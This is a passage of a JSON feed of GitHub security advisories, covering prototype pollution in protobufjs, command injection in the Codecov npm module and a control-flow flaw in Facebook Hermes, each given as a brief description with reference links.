href=\"https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2841507\">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2841507</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-PROTOBUFJS-2441248\">https://snyk.io/vuln/SNYK-JS-PROTOBUFJS-2441248</a></li>\n<li><a href=\"https://github.com/protobufjs/protobuf.js/pull/1735\">https://github.com/protobufjs/protobuf.js/pull/1735</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g954-5hwp-pp24\">https://github.com/advisories/GHSA-g954-5hwp-pp24</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g954-5hwp-pp24",
            "title": "[protobufjs] Prototype Pollution in protobufjs",
            "date_modified": "2022-06-27T21:06:33.000Z",
            "date_published": "2022-05-28T00:00:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g954-5hwp-pp24"
            }
        },
        {
            "content_html": "<p>The package protobufjs before 6.11.3 and 6.10.3 is vulnerable to Prototype Pollution, which can allow an attacker to add/modify properties of the Object.prototype.</p>\n<p>This vulnerability can occur in multiple ways:</p>\n<ol>\n<li>by providing untrusted user input to util.setProperty or to ReflectionObject.setParsedOption functions</li>\n<li>by parsing/loading .proto files</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-25878\">https://nvd.nist.gov/vuln/detail/CVE-2022-25878</a></li>\n<li><a href=\"https://github.com/protobufjs/protobuf.js/pull/1731\">https://github.com/protobufjs/protobuf.js/pull/1731</a></li>\n<li><a href=\"https://github.com/protobufjs/protobuf.js/commit/b5f1391dff5515894830a6570e6d73f5511b2e8f\">https://github.com/protobufjs/protobuf.js/commit/b5f1391dff5515894830a6570e6d73f5511b2e8f</a></li>\n<li><a href=\"https://github.com/protobufjs/protobuf.js/blob/d13d5d5688052e366aa2e9169f50dfca376b32cf/src/util.js%23L176-L197\">https://github.com/protobufjs/protobuf.js/blob/d13d5d5688052e366aa2e9169f50dfca376b32cf/src/util.js%23L176-L197</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2841507\">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2841507</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-PROTOBUFJS-2441248\">https://snyk.io/vuln/SNYK-JS-PROTOBUFJS-2441248</a></li>\n<li><a href=\"https://github.com/protobufjs/protobuf.js/pull/1735\">https://github.com/protobufjs/protobuf.js/pull/1735</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g954-5hwp-pp24\">https://github.com/advisories/GHSA-g954-5hwp-pp24</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g954-5hwp-pp24",
            "title": "[protobufjs] Prototype Pollution in protobufjs",
            "date_modified": "2022-06-27T21:06:33.000Z",
            "date_published": "2022-05-28T00:00:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g954-5hwp-pp24"
            }
        },
        {
            "content_html": "<p>Codecov npm module before 3.6.2 allows remote attackers to execute arbitrary commands via the \"gcov-args\" argument.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-7596\">https://nvd.nist.gov/vuln/detail/CVE-2020-7596</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-CODECOV-543183\">https://snyk.io/vuln/SNYK-JS-CODECOV-543183</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mh2h-6j8q-x246\">https://github.com/advisories/GHSA-mh2h-6j8q-x246</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mh2h-6j8q-x246",
            "title": "[codecov] Improper Neutralization of Special Elements in Output Used by a Downstream Component in Codecov",
            "date_modified": "2022-06-27T21:02:06.000Z",
            "date_published": "2022-05-24T17:07:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mh2h-6j8q-x246"
            }
        },
        {
            "content_html": "<p>A logic vulnerability when handling the SaveGeneratorLong instruction in Facebook Hermes prior to commit b2021df620824627f5a8c96615edbd1eb7fdddfc allows attackers to potentially read out of bounds or theoretically execute arbitrary code via crafted JavaScript. Note that this is only exploitable if the application using Hermes permits evaluation of untrusted JavaScript. Hence, most React Native applications are not affected.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-1914\">https://nvd.nist.gov/vuln/detail/CVE-2020-1914</a></li>\n<li><a href=\"https://github.com/facebook/hermes/commit/b2021df620824627f5a8c96615edbd1eb7fdddfc\">https://github.com/facebook/hermes/commit/b2021df620824627f5a8c96615edbd1eb7fdddfc</a></li>\n<li><a href=\"https://www.facebook.com/security/advisories/cve-2020-1914\">https://www.facebook.com/security/advisories/cve-2020-1914</a></li>\n<li><a href=\"https://github.com/facebook/hermes/issues/373\">https://github.com/facebook/hermes/issues/373</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-327c-qx3v-h673\">https://github.com/advisories/GHSA-327c-qx3v-h673</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-327c-qx3v-h673",
            "title": "[hermes-engine] Always-Incorrect Control Flow Implementation in Facebook Hermes",
            "date_modified": "2022-06-27T17:05:28.000Z",
            "date_published": "2022-05-24T17:30:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-327c-qx3v-h673"
            }
        }
    ]
}